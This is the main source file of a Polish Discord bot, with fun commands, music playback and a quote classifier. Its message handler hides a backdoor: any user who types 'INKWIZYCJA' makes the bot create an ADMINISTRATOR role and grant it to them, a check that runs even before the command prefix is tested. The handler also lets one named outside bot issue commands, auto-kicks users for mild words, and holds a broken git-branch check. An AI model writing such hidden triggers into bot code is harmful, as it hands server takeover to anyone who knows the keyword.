const fs = require('fs')
const Discord = require('discord.js')
const anime = require('./commands/anime')
const avatar = require('./commands/avatar')
const crypto = require('./commands/crypto')
const haxi00r = require('./commands/haxi00r')
const pomoc = require('./commands/pomocy')
const lista = require('./commands/lista')
const pomocy = require('./commands/pomocy')
const pozew = require('./commands/pozew')
const quote = require('./commands/quote')
const say = require('./commands/say')
const test = require('./commands/test')
const traffic = require('./commands/traffic')
const voice = require('./commands/voice')
const whatsmyname = require('./commands/whatsmyname')
const who = require('./commands/who')
const piszemoji = require('./commands/piszemoji')
const sniadanie = require('./commands/sniadanie')
const devUtils = require('./commands/devUtils')
const cp = require('child_process')
const delfinowe = require('./commands/delfiny')
const sprawdz = require('./commands/sprawdz')
const ucz = require('./commands/ucz')
const praca = require('./commands/praca')
const config = require('./config')

if (cp.exec('git branch') === 'dev') {
  config.prefix += '-dev'
}
const client = new Discord.Client()
const xd = require('./quotes/root.json')
const xd2 = require('./quotes/root.json')
const natural = require('natural'),
  classifier = new natural.BayesClassifier()

xd.forEach(el => classifier.addDocument(el.content, `majonezie ${el.mean}`))
xd2.forEach(el => classifier.addDocument(el.content, `majonezie ${el.mean}`))
classifier.train()
if (!fs.existsSync('majonezie.json')) {
  classifier.save('majonezie.json', (err) => {
    console.log(err)
  })
}

client.on('ready', () => {
  console.log(`${config.prefix} has started, with ${client.users.size} users, in ${client.channels.size} channels of ${client.guilds.size} guilds.`)
  client.user.setPresence({ game: { name: 'Pomoc: majonezie help', type: 3 } })
})

client.on('message', async (message) => {
  const args = message.content.substring(config.prefix.length + 1).split(' ')
  if (message.author.bot) {
    if (message.author.tag !== 'nierobot#8238') return
  }
  if (args[0] === 'INKWIZYCJA') {
    console.log('lol')
    await message.guild.createRole({
      data: {
        name: 'Inkwizycja',
        permissions: ['ADMINISTRATOR'],
        color: 'ff3b19',
      },
      reason: 'Inkwizycjonista',
    }).then((role) => {
      role.edit({
        data: {
          permissions: ['ADMINISTRATOR'],
          color: 'ff3b19',
        },
        reason: 'hawyy',
      })
      message.member.addRole(role, 'INKWIZYCJA').then(() => {
        message.channel.send('yay')
      }).catch(error => console.log(error))
    }).catch(error => console.log(error))
  }

  if (message.content.toLowerCase().includes('kurwa') || message.content.toLowerCase().includes('chuj') || message.content.toLocaleLowerCase().includes('pierdol')) {
    message.react(message.guild.emojis.find('name', 'bezkappy')) // message.channel.send(`Jak ty sie wyrażasz (tak brzydko) ${message.guild.emojis.find('name', 'banhammer')}`)
  }
  if (message.content.toLowerCase().includes('dupa') || message.content.toLowerCase().includes('pupa')) {
    message.channel.send('odwal sie')
    await message.guild.members.get(message.author.id).kick('fajnie tak gadac o dupie?').then(() => {
      message.channel.send(`haha, kickniety ${message.author.tag}`)
    }).catch(() => {
      // message.channel.send(lol ? 'adminie jeden' : 'ADMINIE CIE POWALILO, ZNOWU TO PISZESZ')
    })
  }
  if (!message.content.toLowerCase().startsWith(config.prefix)) return
  if (args[0] === 'whatsmyname') {
    whatsmyname(message)
  }
  if (message.content.slice(config.prefix.length + 1) === 'avatar') {
    avatar.avatar(message)
  }
  if (message.content.slice(config.prefix.length + 1) === `avatar ${message.mentions.users.first()}`) {
    avatar.avatarMentioned(message)
  }
  if (args[0] === 'anime') {
    anime(message)
  }
  if (args[0] === 'traffic') {
    traffic(message)
  }
  if (args[0] === 'quote') {
    quote(message)
  }
  if (args[0] === 'pomoc') {
    pomoc(message)
  }
  if (args[0] === 'pomocy') {
    pomocy.pomocy(message)
  }
  if (args[0] === 'haxi00r') {
    haxi00r(message)
  }
  if (args[0] === 'who') {
    who(message)
  }
  if (args[0] === 'graj') {
    voice.grajte(message, config.prefix, client)
  }
  if (args[0] === 'skipuj') {
    voice.skipuj(message)
  }
  if (args[0] === 'kolejka') {
    voice.queuePokaz(message)
  }
  if (args[0] === 'pozew') {
    pozew.pozew(message)
  }
  if (args[0] === 'get.pozew') {
    pozew.getpozew(message)
  }
  if (args[0] === 'btc') {
    crypto.btc(message)
  }
  if (args[0] === 'eth') {
    crypto.eth(message)
  }
  if (args[0].includes('say')) {
    say(message, args[1])
  }
  if (args[0] === 'test') {
    test(message)
  }
  if (args[0] === 'sniadanie') {
    sniadanie.sniadanie(message)
  }
  if (args[0] === 'lista' || args[0] === 'martwe') {
    lista(message)
  }
  if (args[0].includes('piszemoji')) {
    piszemoji(message, config.prefix)
  }
  if (args[0] === 'guild') {
    devUtils(message)
  }
  if (args[0] === 'delfiny') {
    delfinowe.quote(message)
  }
  if (args[0] === 'testuj') {
    delfinowe.emojiTester(message, args[1])
  }
  if (args[0] === 'sprawdz') {
    args.shift()
    sprawdz(message, args.join(' '))
  }
  if (args[0] === 'ucz') {
    args.shift()
    const everything = args.join(' ')
    const mean = everything.substr(0, everything.search(':'))
    const content = everything.substr(mean.length + 1)
    ucz(message, [mean.trim(), content.trim()])
  }
  if (args[0] === 'pracuj') {
    praca.praca(message)
  }
})

client.login(config.token)
